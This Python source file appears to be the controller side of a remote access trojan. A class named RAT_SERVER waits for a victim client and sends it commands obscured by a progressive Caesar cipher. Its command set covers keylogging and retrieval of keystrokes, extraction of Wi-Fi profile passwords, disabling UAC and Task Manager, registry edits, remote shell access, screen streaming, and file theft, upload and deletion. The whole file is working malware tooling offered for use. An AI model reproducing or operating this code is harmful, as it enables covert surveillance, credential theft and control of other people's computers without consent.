import socket

def progressive_caesar_encrypt(text):
    """
    Cifra el texto usando un método de cifrado César progresivo.
    
    En lugar de usar un desplazamiento fijo como en el cifrado César clásico, esta función aplica un desplazamiento que 
    incrementa con cada letra del texto. La primera letra se desplaza 1 posición en el alfabeto, la segunda se desplaza 
    2 posiciones, la tercera 3 posiciones, y así sucesivamente. El desplazamiento se reinicia en el alfabeto cuando llega 
    al final (cifrado modular). Solo se cifran los caracteres alfabéticos.

    Args:
        text (str): El texto a cifrar.
        
    Returns:
        str: El texto cifrado con desplazamientos progresivos.
    """
    result = ''
    shift = 1 

    for char in text:
        if char.isalpha():
            shift_base = 65 if char.isupper() else 97
            result += chr((ord(char) - shift_base + shift) % 26 + shift_base)
            shift += 1 
        else:
            result += char

    return result

class RAT_SERVER:
    def __init__(self, host, port):
        self.host = host
        self.port = port
    
    def build_connection(self):
        global client, addr, s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, self.port))
        s.listen(5)
        print("[*] Waiting for the client...")
        client, addr = s.accept()
        print()
        ipcli = client.recv(1024).decode()
        print(f"[*] Connection is established successfully with {ipcli}")
        print()
    
    def server(self):
        try:
            from vidstream import StreamingServer
            global server
            server = StreamingServer(self.host, 8080)
            server.start_server()
        except:
            print("Module not found...")
    
    def stop_server(self):
        server.stop_server()
    
    def result(self):
        client.send(command_encrypted.encode())
        result_output = client.recv(1024).decode()
        print(result_output)
    
    def banner(self):
        print("======================================================")
        print("                       Commands :)                    ")
        print("======================================================")
        print("System: ")
        print("======================================================")
        print(f'''
help                      all commands available
writein <text>            write the text to current opened window
reboot                    reboot the system
drivers                   all drivers of PC
kill                      kill the system task
sendmessage               send messagebox with the text
cpu_cores                 number of CPU cores
systeminfo (extended)     all basic info about system (via cmd)
tasklist                  all system tasks
localtime                 current system time
curpid                    PID of client's process
sysinfo (shrinked)        basic info about system (Powers of Python)
shutdown                  shutdown client's PC
isuseradmin               check if user is admin
extendrights              extend system rights
disabletaskmgr            disable Task Manager
enabletaskmgr             enable Task Manager
disableUAC                disable UAC
monitors                  get all used monitors
setvalue                  set value in registry
delkey                    delete key in registry
createkey                 create key in registry
exit                      terminate the session of RAT
''')
        print("======================================================")
        print("Shell: ")
        print("======================================================")
        print(f'''
pwd                       get current working directory
shell                     execute commands via cmd
cd                        change directory
[Driver]:                 change current driver
cd ..                     change directory back
dir                       get all files of current directory
abspath                   get absolute path of files
''')
        print("======================================================")
        print("Network: ")
        print("======================================================")
        print(f'''
ipconfig                  local ip
portscan                  port scanner
profiles                  network profiles
profilepswd               password for profile
''')
        print("======================================================")
        print("Input devices: ")
        print("======================================================")
        print(f'''
keyscan_start             start keylogger
send_logs                 send captured keystrokes
stop_keylogger            stop keylogger
''')
        print("======================================================")
        print("Files:")
        print("======================================================")
        print(f'''
delfile <file>            delete file
editfile <file> <text>    edit file
createfile <file>         create file
download <file> <homedir> download file
upload                    upload file
cp <file1> <file2>        copy file
mv <file> <path>          move file
searchfile <file> <dir>   search for file in mentioned directory
mkdir <dirname>           make directory
rmdir <dirname>           remove directory
startfile <file>          start file
readfile <file>           read from file
        ''')
        print("======================================================")
    
    def execute(self):
        self.banner()
        while True:
            global command, command_encrypted
            command = input('Command >>  ')

            command_encrypted = progressive_caesar_encrypt(command)

            if command == 'shell':
                client.send(command_encrypted.encode())
                while 1:
                    command = str(input('>> '))
                    client.send(command.encode())
                    if command.lower() == 'exit':
                        break
                    result_output = client.recv(1024).decode()
                    print(result_output)
                client.close()
                s.close()
            
            elif command == 'drivers':
                self.result()
            
            elif command == 'setvalue':
                client.send(command_encrypted.encode())
                const = str(input("Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
                root = str(input('Enter the path to store key [ex. SOFTWARE\\test]: '))
                key = str(input('Enter the key name: '))
                value = str(input('Enter the value of key [None, 0, 1, 2 etc.]: '))
                client.send(const.encode())
                client.send(root.encode())
                client.send(key.encode())
                client.send(value.encode())
                result_output = client.recv(1024).decode()
                print(result_output)
            
            elif command == 'delkey':
                client.send(command_encrypted.encode())
                const = str(input("Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
                root = str(input('Enter the path to key: '))
                client.send(const.encode())
                client.send(root.encode())
                result_output = client.recv(1024).decode()
                print(result_output)
            
            elif command == 'createkey':
                client.send(command_encrypted.encode())
                const = str(input("Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
                root = str(input('Enter the path to key: '))
                client.send(const.encode())
                client.send(root.encode())
                result_output = client.recv(1024).decode()
                print(result_output)
            
            elif command == 'disableUAC':
                self.result()
            
            elif command == 'reboot':
                self.result()
            
            elif command == 'usbdrivers':
                self.result()
            
            elif command == 'monitors':
                self.result()
            
            elif command[:4] == 'kill':
                if not command[5:]:
                    print("No process mentioned to terminate")
                else:
                    self.result()
            
            elif command == 'extendrights':
                self.result()
            
            elif command == 'keyscan_start':
                client.send(command_encrypted.encode())
                result_output = client.recv(1024).decode()
                print(result_output)
            
            elif command == 'send_logs':
                client.send(command_encrypted.encode())
                result_output = client.recv(1024).decode()
                print(result_output)
            
            elif command == 'stop_keylogger':
                client.send(command_encrypted.encode())
                result_output = client.recv(1024).decode()
                print(result_output)
            
            elif command[:7] == 'delfile':
                if not command[8:]:
                    print("No file to delete")
                else:
                    self.result()
            
            elif command[:10] == 'createfile':
                if not command[11:]:
                    print("No file to create")
                else:
                    self.result()
            
            elif command == 'tasklist':
                self.result()
            
            elif command == 'ipconfig':
                self.result()
            
            elif command[:7] == 'writein':
                if not command[8:]:
                    print("No text to output")
                else:
                    self.result()
            
            elif command == 'sendmessage':
                client.send(command_encrypted.encode())
                text = str(input("Enter the text: "))
                client.send(text.encode())
                title = str(input("Enter the title: "))
                client.send(title.encode())
                result_output = client.recv(1024).decode()
                print(result_output)
            
            elif command == 'profilepswd':
                client.send(command_encrypted.encode())
                profile = str(input("Enter the profile name: "))
                client.send(profile.encode())
                result_output = client.recv(2147483647).decode()
                print(result_output)
            
            elif command == 'profiles':
                self.result()

            elif command == 'cpu_cores':
                self.result()
            
            elif command[:2] == 'cd':
                if not command[3:]: 
                    print("No directory")
                else:
                    self.result()
            
            elif command == 'cd ..':
                self.result()
            
            elif command[1:2] == ':':
                self.result()
            
            elif command == 'dir':
                self.result()
            
            elif command == 'portscan':
                self.result()
            
            elif command == 'systeminfo':
                self.result()
            
            elif command == 'localtime':
                self.result()
            
            elif command[:7] == 'abspath':
                if not command[8:]:
                    print("No file")
                else:
                    self.result()
            
            elif command[:8] == 'readfile':
                if not command[9:]:
                    print("No file to read")
                else:
                    client.send(command_encrypted.encode())
                    result_output = client.recv(2147483647).decode()
                    print("===================================================")
                    print(result_output)
                    print("===================================================")
            
            elif command[:2] == 'cp':
                self.result()
            
            elif command[:2] == 'mv':
                self.result()
            
            elif command[:8] == 'editfile':
                self.result()
            
            elif command[:5] == 'mkdir':
                if not command[6:]:
                    print("No directory name")
                else:
                    self.result()
            
            elif command[:5] == 'rmdir':
                if not command[6:]:
                    print("No directory name")
                else:
                    self.result()
            
            elif command[:10] == 'searchfile':
                self.result()
            
            elif command == 'curpid':
                self.result()
            
            elif command == 'sysinfo':
                self.result()
            
            elif command == 'pwd':
                self.result()
            
            elif command[:9] == 'startfile':
                if not command[10:]:
                    print("No file to launch")
                else:
                    self.result()

            elif command[:8] == 'download':
                try:
                    client.send(command_encrypted.encode())
                    file = client.recv(2147483647)
                    with open(f'{command.split(" ")[2]}', 'wb') as f:
                        f.write(file)
                        f.close()
                    print("File is downloaded")
                except: 
                    print("Not enough arguments")

            elif command == 'upload':
                client.send(command_encrypted.encode())
                file = str(input("Enter the filepath to the file: "))
                filename = str(input("Enter the filepath to outcoming file (with filename and extension): "))
                data = open(file, 'rb')
                filedata = data.read(2147483647)
                client.send(filename.encode())
                print("File has been sent")
                client.send(filedata)
            
            elif command == 'disabletaskmgr':
                self.result()
            
            elif command == 'enabletaskmgr':
                self.result()
            
            elif command == 'isuseradmin':
                self.result()
            
            elif command == 'help':
                self.banner()

            elif command == 'exit':
                client.send(command_encrypted.encode())
                output = client.recv(1024)
                output = output.decode()
                print(output)
                s.close()
                client.close()

rat = RAT_SERVER('127.0.0.1', 4444)

if __name__ == '__main__':
    rat.build_connection()
    rat.execute()